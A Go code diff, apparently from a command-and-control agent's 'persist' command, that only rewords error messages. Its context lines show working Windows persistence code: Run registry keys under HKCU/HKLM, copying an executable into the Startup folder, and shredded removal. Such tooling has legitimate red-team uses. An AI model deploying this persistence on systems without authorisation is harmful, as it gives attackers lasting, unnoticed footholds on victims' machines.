@@ -85,7 +85,7 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 // persistRegistryRun adds/removes a registry Run key entry
 func persistRegistryRun(args persistArgs) structs.CommandResult {
 	if args.Name == "" {
-		return errorResult("Error: name is required for registry persistence")
+		return errorResult("name is required for registry persistence")
 	}
 
 	// Determine hive — default to HKCU (doesn't need admin)
@@ -104,7 +104,7 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 		hiveKey = registry.LOCAL_MACHINE
 		regPath = `Software\Microsoft\Windows\CurrentVersion\Run`
 	default:
-		return errorf("Error: unsupported hive '%s'. Use HKCU or HKLM", hive)
+		return errorf("unsupported hive '%s'. Use HKCU or HKLM", hive)
 	}
 
 	switch strings.ToLower(args.Action) {
@@ -113,19 +113,19 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 			// Default to current executable
 			exe, err := os.Executable()
 			if err != nil {
-				return errorf("Error getting executable path: %v", err)
+				return errorf("getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
 
 		key, _, err := registry.CreateKey(hiveKey, regPath, registry.SET_VALUE)
 		if err != nil {
-			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
+			return errorf("opening %s\\%s: %v", hive, regPath, err)
 		}
 		defer key.Close()
 
 		if err := key.SetStringValue(args.Name, args.Path); err != nil {
-			return errorf("Error writing registry value: %v", err)
+			return errorf("writing registry value: %v", err)
 		}
 
 		return successf("Installed registry run key:\n  Key:   %s\\%s\n  Name:  %s\n  Value: %s", hive, regPath, args.Name, args.Path)
@@ -133,7 +133,7 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 	case "remove":
 		key, err := registry.OpenKey(hiveKey, regPath, registry.SET_VALUE|registry.QUERY_VALUE)
 		if err != nil {
-			return errorf("Error opening %s\\%s: %v", hive, regPath, err)
+			return errorf("opening %s\\%s: %v", hive, regPath, err)
 		}
 		defer key.Close()
 
@@ -143,7 +143,7 @@ func persistRegistryRun(args persistArgs) structs.CommandResult {
 		return successf("Removed registry run key (shredded):\n  Key:  %s\\%s\n  Name: %s", hive, regPath, args.Name)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
@@ -156,7 +156,7 @@ func persistStartupFolder(args persistArgs) structs.CommandResult {
 		if args.Path == "" {
 			exe, err := os.Executable()
 			if err != nil {
-				return errorf("Error getting executable path: %v", err)
+				return errorf("getting executable path: %v", err)
 			}
 			args.Path = exe
 		}
@@ -170,42 +170,42 @@ func persistStartupFolder(args persistArgs) structs.CommandResult {
 		// Copy the file to the startup folder
 		src, err := os.Open(args.Path)
 		if err != nil {
-			return errorf("Error opening source '%s': %v", args.Path, err)
+			return errorf("opening source '%s': %v", args.Path, err)
 		}
 		defer src.Close()
 
 		dst, err := os.Create(destPath)
 		if err != nil {
-			return errorf("Error creating '%s': %v", destPath, err)
+			return errorf("creating '%s': %v", destPath, err)
 		}
 		defer dst.Close() // Safety net for panics; explicit Close below catches flush errors
 		bytes, err := io.Copy(dst, src)
 		if err != nil {
 			dst.Close()
-			return errorf("Error copying file: %v", err)
+			return errorf("copying file: %v", err)
 		}
 
 		if err := dst.Close(); err != nil {
-			return errorf("Error finalizing destination file: %v", err)
+			return errorf("finalizing destination file: %v", err)
 		}
 
 		return successf("Installed startup folder persistence:\n  Source: %s\n  Dest:   %s\n  Size:   %d bytes", args.Path, destPath, bytes)
 
 	case "remove":
 		if args.Name == "" {
-			return errorResult("Error: name is required to remove startup folder entry")
+			return errorResult("name is required to remove startup folder entry")
 		}
 
 		destPath := filepath.Join(startupDir, args.Name)
 		secureRemove(destPath)
 		if _, err := os.Stat(destPath); err == nil {
-			return errorf("Error removing '%s': file still exists", destPath)
+			return errorf("removing '%s': file still exists", destPath)
 		}
 
 		return successf("Removed startup folder entry: %s", destPath)
 
 	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+		return errorf("unknown action '%s'. Use: install or remove", args.Action)
 	}
 }
 
